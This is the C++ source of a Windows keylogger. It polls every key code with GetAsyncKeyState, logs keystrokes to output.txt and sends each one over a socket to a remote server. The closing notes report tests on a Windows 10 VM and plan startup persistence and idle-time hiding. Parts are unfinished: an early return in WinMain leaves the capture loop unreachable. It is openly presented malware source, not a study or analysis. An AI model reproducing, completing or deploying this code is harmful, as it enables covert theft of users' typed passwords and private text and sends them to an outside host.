/*
*    ``~ Main file for the keylogger program (Written by haeoro) ~``
*
*    WinMain() initializes all mappings, checks if any key on the keyboard is being pressed.
*    once a key's value has been found and written to a file, key = 0 tells the program that the key has been found
*    and logged, and that it should continue checking other keys to see if they're being pressed. 
*
*    writeKeyStroke() takes an int key argument, then converts that integer to it's corresponding ascii value using 
*    static_cast conversion method, then closes the file.
*/

#include "core/mappings.h"
#include "core/constants.h"
#include "core/find_shift_keys.h"
#include "networking/ks2server.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <winsock2.h>
#include <psapi.h>

int retrieveProcessName(DWORD procID, char mainProcName[]) 
{
    char procName[MAX_PATH];
    HMODULE hMod;
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (procHandle) 
    {
        GetModuleBaseNameA(procHandle, hMod, procName, sizeof(procName)/sizeof(char));
    }

    std::cout << procName << " " << mainProcName << '\n';
    CloseHandle(procHandle);
    return 1;
}

int isProcRunning() 
{
    DWORD procIDs[1024];
    char mainProcName[MAX_PATH];
    char test[MAX_PATH] = "hello"; 
    HMODULE hmModule;
    DWORD cbNeeded;
    HANDLE mainProcHandle = GetCurrentProcess();
    if (mainProcHandle) 
    {
        GetModuleBaseNameA(mainProcHandle, hmModule, mainProcName, sizeof(mainProcName)/sizeof(char));
    }
    CloseHandle(mainProcHandle);
    EnumProcesses(procIDs, sizeof(procIDs), &cbNeeded);
    //std::cout << mainProcName;
    //return 1;
    for (int i = 1; procIDs[i] != 0; i++) 
    {
        retrieveProcessName(procIDs[i], mainProcName);
    }
    return 0;
}

void writeKeyStroke(int trueKey, SOCKET sObjC)
{
    std::ofstream file;
    file.open("output.txt", std::ios::app);
    char trueKeyC = static_cast<char>(trueKey);
    if (trueKey == ENTER)
    {
        file << "\n";
    } 
    else 
    {
        if (sObjC != 1) 
        {
            send(sObjC, &trueKeyC, 2, MSG_OOB);
        }
        file << trueKeyC;
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    isProcRunning();
    return 1;
    Maps vkMaps;
    SOCKET sObjClient = initClient();
    vkMaps.initializeMaps();
    while (true)
    {
        for (int i = 1; i < 254; i++) 
        {
            int key = GetAsyncKeyState(i);
            int dontLogShiftKey = (i != 16 && i != 160 && i != 161);
            while (key == KEY_IS_PRESSED && dontLogShiftKey)
            {
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey(), sObjClient);
                }
                else if (vkMaps.searchMiscMaps(i) != 1) 
                {
                    // null statement as there is no code logic required here.
                    ;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey, sObjClient);
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey, sObjClient);
                }
                key = 0;
            }
        }
    }
}

/*
        Notes
    
    test results and conclusion: 
        * console window shows on w10 vm, closing still keeps the process running though.
        * keylogger can run multiple instances, not only does this cause performance issues, but also ruins the integrity of the data.
    
    so far, these are the only issues I've found during testing. That and additional dll files are needed to run
    independently. 
    

        To-Do list
    ~ create a function to check if the code program is already running. 
        todo: fix code in isProcRunning so that mainProcName is getting data assigned by GetModuleBaseNameA(). 

    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
    ~ write code to schedule this program to be run on startup.
    ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves.
    ~ find a way to decrease cpu usage. 

        Ideas
    ~ implement code to check if user is idle, if so then exit the loop and wait til mouse moves. 
*/